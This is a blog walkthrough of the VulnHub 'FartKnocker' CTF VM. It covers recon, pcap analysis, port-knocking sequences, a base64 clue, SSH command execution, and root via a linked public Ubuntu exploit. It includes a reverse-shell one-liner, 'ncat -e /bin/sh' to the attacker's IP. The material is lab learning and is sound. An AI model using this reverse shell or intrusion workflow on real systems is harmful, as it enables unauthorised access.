---
layout: post
title: Walkthrough FartKnocker
date: 2016-05-11 22:57:50.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags:
- CTF
- pen-testing
- security
- vulnhub
meta:
  _oembed_1563c73acd9e0504baf061f20c23b0c4: "{{unknown}}"
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '22719287049'
author:
  login: tidlost
  email: tl.dr.mfw@gmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---
Another VM is done. Here is the writeup. And here is the [link to the VM on vulnhub.](https://www.vulnhub.com/entry/tophatsec-fartknocker,115)

## Recon

```
$ netdiscover -r 192.168.1.1/24
192.168.1.103   08:00:27:3d:0d:c8      1      60  Cadmus Computer System
```

The Nmap-scan.

```
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:3D:0D:C8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.12%E=4%D=5/9%OT=80%CT=1%CU=42070%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=57311E63%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=I%
OS:TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)
```

So port 80 is the only one open. An interesting little detail here is that it says that it found "65534 closed ports", and then it says: Reason: 65534 resets. I think that means that the server has responded with RST/ACK. Something I learned in this challenge. But we will get to that.
On port 80 we find a file named pcap1.pcap. So I open it up in wireshark.

To the experienced packet-inspector I guess that it is quite obvious what is going on in this packet-capture. But I had never heard about port-knocking. So I got lost on a detour for quite some time. I was inspecting the ICMP-packets. All of those packets ended with `"!"#$%&'()*+,-./01234567"`. Something that I though was suspicious. So I started googeling about hacks that use ICMP and found a lot.

It turns out that you can use the ICMP-protocol to hide, or tunnel, other services. So I thought that someone had injected a Loki-rootkit into the server, and what I was observing was the communication between the hacker (with ip ...102) and the victim-server. And that I was supposed to enter through the same exploit. But after going through the ICMP-packets in detail I realized that they really were just pings, and nothing else. They never contained more data than the default `"!"#$%&'()*+,-./01234567"`, which I learned could be used to fingerprint the server. This data meant that the server probably was a linux. So after discarding all the ICMP packets I started to look into the TCP-packets more closely. And after some creative googeling about ports I learned about port-knocking.

### Port knocking
So I downloaded knockd, that is used to implement port-knocking. And I got it to work by running this command:

```
knock 192.168.1.103 7000 8000 9000
nc 192.168.1.103 8888
```

This also worked:

```
for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.1.103; done
nc 192.168.1.103 8888
```

And this:

```
nc 192.168.1.103 7000
nc 192.168.1.103 8000
nc 192.168.1.103 9000
nc 192.168.1.103 8888

```
Anyways, it lead me to this address: /burgerworld. I downloaded the pcap-file and continued. I went through each and every packet in detail to understand how they all worked. But I am not going to bore you with that. So I right-clicked on a TCP-packet and then clicked on follow tcp-stream. And it showed me a nice ascii-image of beavis (or butthead, can't remember who's who). And the text: eins drei drei sieben. So I google-translated the text, and it was what I though, the classic number 1337. So after trying every single possible combination of portknocking I finally figured out that it was supposed to be 1 3 3 7. And then nc to port 1337. There I found: /iamcornholio/ which gave me this text:
`huhhuhhh...Hey Beavis...Im all about uhhh...huhuh...that base huhhuhhh... T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK`
So the base-comment made me think that it was probably base64-encoded. And it was.
It translated into: Open up SSH: 8888 9999 7777 6666
So I knocked the port and got access to port 22.

```
$ ssh root@192.168.1.103                                                   
The authenticity of host '192.168.1.103 (192.168.1.103)' can't be established.
ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.103' (ECDSA) to the list of known hosts.
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
```

So I logged in as butthead, but was immedietly thrown out.
From doing some challenges on overthewire I learned that you can execute commands with SSH without getting an actual shell.
But first I downloaded sshpass to be able to make the process a bit easier, and then:

```
sshpass -p nachosrule ssh butthead@192.168.1.103 ls
nachos

```
So then I used nc to get a permanent shell.

```
$ sshpass -p nachosrule ssh butthead@192.168.1.103 "ncat -e /bin/sh 192.168.1.106 1234"
```

## Escalation
So I got a shell, and it was time to escalate.
I ran the linEnum.sh script and waded through the info. And checked for vulns on sudo. But nothing really of interest. Some meaningless tuff in /tmp, some scripts in beavis. Then I found pcap3 and pcap4. That I studied thoroughly. In pcap4 I saw that there was some ssh-keychanges going on, and some encrypted data-transfer. But after some googeling I concluded that there is not really any way I could possibly break that. SSH with Diffie-hellman seems pretty waterproof.
In the end I ended up running the Ubuntu 14 priv-exploit that I have used on some other VM:s. This one: https://www.exploit-db.com/exploits/37292/. That exploit really is incredible/incredibly dangerous.
So I became root and got the SECRETZ in /root.

## Conclusion
Packet-analysis really was awesome. A lot of fun and interesting stuff. I feel like I have really started to get a grip of how packets are structured, and started to get to know Wireshark a lot more. So the main takeaways from this VM really was learning packet-analysis and about port-knocking.
Thanks to [top-hat-sec](https://www.top-hat-sec.com/r4v3ns-blog/fartknocker-vm-challenge) for another great VM!
After reading other writeups I learned about https://digi.ninja/projects/cewl.php. Which I am really excited about trying out. Gonna try it soon.
